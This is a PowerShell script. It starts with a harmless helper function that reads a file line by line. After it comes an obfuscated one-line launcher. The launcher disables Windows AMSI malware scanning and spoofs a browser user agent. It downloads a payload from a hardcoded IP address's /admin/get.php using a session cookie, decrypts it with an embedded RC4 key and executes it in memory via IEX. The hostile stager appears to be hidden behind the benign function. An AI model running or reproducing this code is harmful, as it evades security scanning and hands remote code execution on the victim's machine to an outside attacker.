











function Get-Lines ([string]$file) {
    begin {
        $file = (Resolve-Path $file).ToString()

        if (!(Test-Path $file)) {
            Throw "File not found: $file"
        }

        try {
            
            $stream = [System.IO.File]::OpenText($file)
        } catch {
            Throw $_
        }
    }

    process {
        while (!$stream.EndOfStream) {
            $stream.ReadLine()
        }
        $stream.Close()
        rv stream
    }
}

[REf].AsSeMbLY.GeTTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetFIEld('amsiInitFailed','NonPublic,Static').SETVaLuE($NuLl,$True)};[SYSTem.NET.SErvIcePOINTMANAGeR]::EXpecT100COntInuE=0;$WC=NEw-OBJecT SyStem.NET.WEbClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadeRS.ADd('User-Agent',$u);$wc.PrOxy=[SyStem.NET.WEbREqUesT]::DeFAulTWEBProXy;$Wc.PRoXy.CRedentiAlS = [SysTeM.NeT.CrEDeNtIAlCAche]::DefaUlTNEtwORKCRedeNTialS;$K=[SYsTEM.TExT.ENCODing]::ASCII.GetBYTES('Dv,inKZ<@{3mjG4&1k:Vcl7o)EY*J?6x');$R={$D,$K=$ARGs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUnT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}};$WC.HeADeRS.Add("Cookie","session=S4UqQGzWIqnMvnx/bfEPEy+GaDQ=");$ser='http://35.164.97.4:80';$t='/admin/get.php';$DATa=$WC.DOWnLOADDATA($seR+$T);$IV=$daTA[0..3];$dAtA=$dATA[4..$DATA.lenGTH];-Join[CHAR[]](& $R $dAtA ($IV+$K))|IEX

